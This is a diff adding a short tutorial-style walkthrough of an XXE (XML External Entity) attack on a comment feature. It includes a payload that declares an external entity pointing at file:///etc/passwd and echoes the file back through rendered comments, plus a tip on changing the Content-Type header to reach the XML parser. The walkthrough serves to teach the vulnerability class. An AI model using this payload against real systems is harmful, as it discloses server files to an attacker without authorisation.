@@ -1,1 +1,24 @@
+1. A feature in the application expects an XML to carry comments. The XML document looks like this:
+
+          <?xml version = "1.0" encoding = "UTF-8" ?>
+          <comment>
+             <user>eve</user>
+             <content>Great article!</content>
+          </comment>
+
+   NOTE: Sometimes, even if the application accepts JSON data, you can still try changing the Content-Type HTTP Header from application/json to         application/xml.
+
+2. A malicious user sends the following XML input
+
+            <!--?xml version="1.0" ?-->
+            <!DOCTYPE foo [<!ENTITY myentity SYSTEM "file:///etc/passwd"> ]>  <!-- this is payload -->
+            <comment>
+              <user>eve</user>
+              <content>&myentity;</content>
+            </comment>
+
+3. The application parses the malicious input using the XML Parser.
+4. The content of /etc/passwd gets stored as the comment of the user eve.
+5. The application renders the list of comments, which discloses the server’s /etc/passwd file. 
+6. If we inject a non-existing file, say file:///etc/passwdnotexistent, the server returns an error stating that the file     /etc/passwdnotexistent doesn’t exist.
 
